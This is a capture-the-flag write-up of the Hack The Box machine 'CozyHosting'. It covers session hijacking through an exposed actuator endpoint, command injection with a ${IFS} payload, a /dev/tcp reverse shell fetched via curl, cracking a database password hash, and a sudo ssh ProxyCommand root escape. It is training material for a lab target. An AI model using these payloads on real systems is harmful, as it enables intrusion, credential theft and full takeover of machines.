---
title: HTB-CozyHosting
date: 2024-10-31 10:03:30
tags:
- HTB
---

# #Nmap #
Let's run an Nmap scan to discover any open ports on the remote host.
`sudo nmap -Pn -sC -sV -O -T3 -p- 10.10.11.230 -oN nmap_scan`

```
Nmap scan report for 10.10.11.230
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Nmap shows that there are 2 ports open `22` and `80`. Also the domain is `cozyhosting.htb`
so we add the domain to our `/etc/hosts`
```
echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

# #Webiste #

Login page http://cozyhosting.htb/login

After running `dirsearch -u http://cozyhosting.htb/"` we found an endpoint
http://cozyhosting.htb/actuator

The endpoint revealed some good info
http://localhost:8080/actuator/sessions
http://localhost:8080/actuator/beans
http://localhost:8080/actuator/health
http://localhost:8080/actuator/health/{*path}
http://localhost:8080/actuator/env
http://localhost:8080/actuator/env/{toMatch}
http://localhost:8080/actuator/mappings

# #Endoint /actuator/sessions #
```
{"DAD1A0B9921669A3828FC1BE56330CBD":"kanderson"}
```
The `DAD1A0B9921669A3828FC1BE56330CBD` is the cookie for kanderson so we can change our cookie and hijack the session. After we change the cookie we can go to the /admin panel (we can find it from the /actuator/mappings endpoint)

![Cookie](/images/CozyHosting/Ch(cookie).png)

# #Admin Dashboard #

![Adm_Panel](/images/CozyHosting/Ch(Adm_Pan).png)

At the bottom of the page we see a form that require's a hostname and username for
automatic patching. We try to submit hostname as `127.0.0.1` and username as `test` but we get an error "Host key verification failed."

![Form](/images/CozyHosting/Ch(Form).png)

Probably this means that a service attempts to use ssh to connect to the hostname and username we provide above. As we don't need to provide any passwords it uses a id_rsa so the command that the service runs is "ssh -i id_rsa username@hostname"

After some testing I found out that the username does not allow spaces but we can use ${IFS} to bypass that. A simple way to see if the command injection works it to curl a python server that we will host

```
python3 -m http.server 8888
```

Then we will try to curl our python server and see if we get a callback
`test;curl${IFS}http://10.10.14.15:8888;`

![Curl Form](/images/CozyHosting/Ch(Form_Curl).png)
![Call_Back](/images/CozyHosting/Ch(Callback).png)

Now we can generate a shell and upload it to the machine

```
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.15/1234 0>&1' > rev.sh
```

after creating the rev.sh and our python server is running we start out netcat listener

```
nc -lvnp 1234
```

![Curl_Shell](/images/CozyHosting/Ch(Form_Shell).png)

And we execute a curl command pointing to the rev.sh we created
We got a shell, we can upgrade our shell with running
 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![Shell_APP](/images/CozyHosting/Ch(Shell_App).png)
# #Lateral Movement #

We extract the .jar to tmp
```
unzip -d /tmp/app cloudhosting-0.0.1.jar
```
Inside there after some searching around we can find a application.properties that reveals credentials for a postgresql database.

```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

We can see that a postgresql is running on 5432 and we have creds `postgres:Vg&nvzAQ7XxR`. Using the command `psql -h 127.0.0.1 -U postgres` to log in we use `\list` to list all of the database and we see a `cozyhosting` that looks interesting so we connect to it
```
\connect cozyhosting
```
There are 2 tables one with users and one with hosts we use a simple command to dump the users table.

![Tables](/images/CozyHosting/Ch(Tables).png)

```
select * from users;
```
The admin hash is `$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm`

# #Cracking The hash #

To identify the hash we use `hashid $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm` or `hash-identifier` the hash it a bcrypt so after looking for the correct hashcat mode
we save the hash into a file and use hashcat with mode `3200`.

```
hashcat hash -m 3200 /usr/share/wordlists/rockyou.txt
```

![Hashcat](/images/CozyHosting/Ch(Hashcat).png)
The hash cracked to `manchesterunited` and in the home directory we have seen a user `josh` so we will try to ssh with josh and `manchesterunited`.
```
ssh josh@10.10.11.230
```
the flag is on `/home/josh/user.txt`
# #Privilege Escalation #

We run `sudo -l` and provided the `manchesterunited` as password and we see that we can execute the `/usr/bin/ssh` with sudo.
```
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
with root priv 
```
After a quick search on gtfo bins https://gtfobins.github.io/gtfobins/ssh/ we found that we can run:
```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
and get a root shell, the flag is on `/root/root.txt`
